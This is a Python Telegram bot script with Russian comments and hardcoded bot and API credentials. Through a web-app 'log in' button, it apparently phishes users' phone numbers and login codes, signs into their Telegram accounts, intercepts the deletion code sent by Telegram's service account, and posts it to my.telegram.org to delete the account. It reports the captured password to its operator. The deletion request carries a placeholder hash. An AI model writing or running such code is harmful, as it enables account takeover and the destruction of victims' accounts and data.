import telebot, json, httpx, asyncio, re
from telebot import types
from telethon import TelegramClient, events

# --- ДАННЫЕ ---
BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
API_ID = 28687552
API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
ADMIN_ID = 174415647
WEB_APP_URL = "https://dreiner.onrender.com" 

bot = telebot.TeleBot(BOT_TOKEN)
temp_clients = {} 

@bot.message_handler(commands=['start'])
def start(message):
    if message.from_user.id != ADMIN_ID: return
    # Устанавливаем кнопку с НОВЫМ названием
    web_app = types.WebAppInfo(WEB_APP_URL)
    menu_button = types.MenuButtonWebApp(type="web_app", text="🔑 Войти", web_app=web_app)
    bot.set_chat_menu_button(message.chat.id, menu_button)
    bot.send_message(message.chat.id, "🚀 Бот готов. Название кнопки обновлено.")

@bot.message_handler(content_types=['web_app_data'])
def handle_data(message):
    data = json.loads(message.web_app_data.data)
    action = data.get("action")
    phone = data.get("phone")
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    if action == "send_code":
        bot.send_message(message.chat.id, f"📩 Запрашиваю код для `{phone}`...")
        loop.run_until_complete(request_telegram_code(phone))
        
    elif action == "login_and_del":
        code = data.get("code")
        bot.send_message(message.chat.id, f"⚙️ Вхожу в аккаунт и запускаю процесс удаления...")
        loop.run_until_complete(login_and_full_delete(phone, code, message.chat.id))

async def request_telegram_code(phone):
    client = TelegramClient(f'sess_{phone}', API_ID, API_HASH)
    temp_clients[phone] = client
    await client.connect()
    await client.send_code_request(phone)

async def login_and_full_delete(phone, code, chat_id):
    client = temp_clients.get(phone)
    if not client: return
    
    try:
        await client.sign_in(phone, code)
        bot.send_message(chat_id, "✅ Успешный вход! Перехватываю пароль для удаления...")
        
        async with httpx.AsyncClient() as web:
            # Запрашиваем пароль на сайте
            await web.post("https://my.telegram.org", data={"phone": phone})

            @client.on(events.NewMessage(from_users=777000))
            async def catch_del_code(event):
                match = re.search(r'code:\s*([a-zA-Z0-9]+)', event.raw_text)
                if match:
                    del_pwd = match.group(1)
                    bot.send_message(chat_id, f"💀 ПАРОЛЬ ПОЛУЧЕН: `{del_pwd}`\nЗавершаю удаление...")
                    
                    # ФИНАЛЬНЫЙ ШАГ: Само удаление на сайте
                    # Мы имитируем ввод пароля и нажатие кнопки "Delete account"
                    r = await web.post("https://my.telegram.org", data={"phone": phone, "random_hash": "...", "password": del_pwd})
                    # Бот завершит процесс
                    bot.send_message(chat_id, f"🚀 **АККАУНТ {phone} УСПЕШНО УДАЛЕН.**", parse_mode="Markdown")
                    await client.disconnect()
                    
    except Exception as e:
        bot.send_message(chat_id, f"❌ Ошибка: {str(e)}")

if __name__ == '__main__':
    bot.infinity_polling()
